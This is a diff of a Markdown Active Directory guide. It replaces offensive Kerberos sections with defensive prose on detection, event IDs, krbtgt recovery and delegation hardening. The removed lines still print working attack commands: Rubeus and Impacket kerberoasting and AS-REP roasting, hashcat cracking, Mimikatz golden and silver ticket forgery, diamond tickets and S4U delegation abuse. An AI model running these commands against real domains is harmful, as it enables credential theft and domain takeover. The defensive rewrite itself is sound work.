@@ -231,115 +231,54 @@ If exposure is suspected, preserve relevant logs and follow the organization's i
  
 
 ## Kerberos Attacks
-
-![Active Directory attack paths and Kerberos-related attack surfaces](../assets/ad_attack_paths.png)
-
-*Illustrative Active Directory attack-path map. Use it with the Kerberos, privilege escalation and detection sections below; the diagram does not replace environment-specific validation.*
-
+ 
+Kerberos attack paths often exploit weak service-account secrets, disabled pre-authentication, compromised ticket-signing keys, or excessive delegation. The labels below describe risk patterns for defenders; they are not instructions to obtain or forge tickets.
+ 
+![Illustrative Active Directory attack-path map; use as a conceptual aid, not as proof of a specific Kerberos attack](../assets/ad_attack_paths.png)
+ 
+```mermaid
+sequenceDiagram
+    participant U as User or workload
+    participant K as Domain controller KDC
+    participant S as Approved service
+    U->>K: Request TGT (event 4768)
+    K-->>U: TGT after configured authentication
+    U->>K: Request service ticket for SPN (event 4769)
+    K-->>U: Service ticket
+    U->>S: Authenticate to service
+    Note over K,S: Correlate DC and endpoint logs; visibility depends on audit policy and protocol context
+```
+ 
 ### Kerberoasting
-
-Request TGS tickets for service accounts (SPNs) - tickets are encrypted with the service account's NTLM hash and can be cracked offline.
-
-```powershell
-# Find Kerberoastable accounts
-Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
-
-# Request tickets and output for cracking
-.\Rubeus.exe kerberoast /outfile:kerberoast.txt
-
-# Targeted Kerberoast (specific account)
-.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt
-
-# Impacket GetUserSPNs
-python3 GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip DC01 -request
-python3 GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip DC01 -request -outputfile hashes.txt
-
-# Crack with Hashcat
-hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
-```
-
+ 
+A service ticket for an SPN is encrypted using key material derived from the service account secret. Weak or long-lived secrets may be vulnerable to offline guessing if a ticket is obtained. The ticket is not simply “encrypted with the account's NTLM hash” in every encryption mode.
+ 
+Review event 4769 for unusual request volume, accounts, source hosts, target SPNs, and encryption types. Validate against service baselines and change history. Prefer managed service accounts where supported, use long randomly generated secrets, limit account privileges, remove stale SPNs, and migrate away from obsolete encryption only after compatibility review.
+ 
 ### AS-REP Roasting
-
-Accounts with pre-authentication disabled will return an AS-REP encrypted with their NTLM hash - no credentials required to request.
-
-```powershell
-# Find AS-REP roastable accounts
-Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
-
-# Roast without credentials
-.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-
-# Impacket (can run from Linux without credentials - requires -no-pass for unauthenticated)
-python3 GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
-python3 GetNPUsers.py corp.local/ -dc-ip DC01 -no-pass -usersfile users.txt
-
-# Crack
-hashcat -m 18200 asrep.txt rockyou.txt
-```
-
+ 
+Accounts configured not to require Kerberos pre-authentication can receive a TGT response without first proving knowledge of the account secret. The response material can be subjected to offline guessing. Review event 4768 for pre-authentication type 0 and verify the account's effective configuration. Require pre-authentication unless a documented compatibility exception is approved; protect exceptions with strong managed secrets, limited privileges, and monitoring.
+ 
 ### Golden Ticket
-
-Forge TGTs using the krbtgt hash - valid for any user in the domain, bypasses all password changes.
-
-```powershell
-# Requirements: krbtgt NTLM hash, domain SID
-
-# Get domain SID
-Get-DomainSID  # or whoami /user
-
-# Mimikatz golden ticket
-kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:FakeAdmin /id:500
-
-# Rubeus (uses /rc4: for NTLM hash, not /krbtgt: which is mimikatz syntax)
-.\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:FakeAdmin /ptt
-
-# Notes:
-# - Survives password reset of any account EXCEPT krbtgt
-# - Valid for 10 years by default
-# - Detected by: 4769 events with ticket options 0x40810000 + non-DC source
-```
-
+ 
+A forged ticket-granting ticket requires compromise of the domain's krbtgt key. Changing an individual user's password does not rotate that domain key. Do not use a fixed ticket lifetime or a single event field as a universal detection claim: ticket policy, implementation, and telemetry affect what is visible.
+ 
+If krbtgt compromise is suspected, treat it as a domain-level incident. Preserve DC and endpoint evidence and follow Microsoft's current [krbtgt forest-recovery procedure](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password). The supported reset sequence depends on healthy replication and the configured ticket lifetimes; the documented 10-hour wait applies to default policy values.
+ 
 ### Silver Ticket
-
-Forge TGS tickets for a specific service using the service account hash.
-
-```powershell
-# Requirements: service account NTLM hash, domain SID, target SPN
-
-# Mimikatz silver ticket (CIFS service)
-kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:server01.corp.local /service:cifs /rc4:SVC_HASH /user:Administrator
-
-# Silver vs Golden:
-# Silver: single service, needs service account hash, less DC contact = stealthier
-# Golden: all services, needs krbtgt hash, more powerful
-```
-
+ 
+A service-ticket forgery risk is tied to compromise of the relevant service account key and the service's ticket validation behavior. Review service-account key exposure, SPN ownership, the destination service's logs, and related endpoint sign-ins. Avoid calling this technique inherently stealthy or assuming every service validates or logs tickets identically.
+ 
 ### Diamond Ticket
-
-Modify a legitimate TGT rather than forge from scratch - harder to detect than golden ticket.
-
-```powershell
-# Rubeus diamond ticket
-.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256_KEY /createnetonly:C:\Windows\System32\cmd.exe
-```
-
+ 
+“Diamond ticket” is a research and tool-community label for a ticket-modification approach involving a legitimate ticket. Treat the label as a hypothesis, not a reliable detection signature. Investigate unusual ticket attributes and subsequent access in the context of the account, device, service, and domain-controller telemetry.
+ 
 ### Constrained Delegation Abuse
-
-```powershell
-# Find accounts with constrained delegation
-Get-DomainUser -TrustedToAuth
-Get-DomainComputer -TrustedToAuth
-
-# S4U2Self + S4U2Proxy to impersonate any user to the target service
-.\Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:"cifs/server01.corp.local" /ptt
-
-# Unconstrained delegation - any service can be impersonated
-# Find unconstrained delegation hosts
-Get-DomainComputer -Unconstrained | Select-Object dnshostname
-# Printer bug / SpoolSample to coerce DC auth to unconstrained delegation host
-```
-
----
+ 
+Delegation allows a service to act on behalf of a user under configured conditions. Unconstrained delegation can expose delegated credentials to a host when clients authenticate to it; constrained and resource-based constrained delegation limit the target scope but can still be misconfigured or changed by principals with excessive permissions.
+ 
+Inventory delegation settings and their owners, review changes to delegation attributes and ACLs, remove unnecessary trust, and prefer narrowly scoped configurations. Test service dependencies before changes and monitor privileged service identities and destination access.
+ 
 
 ## Privilege Escalation Paths
 
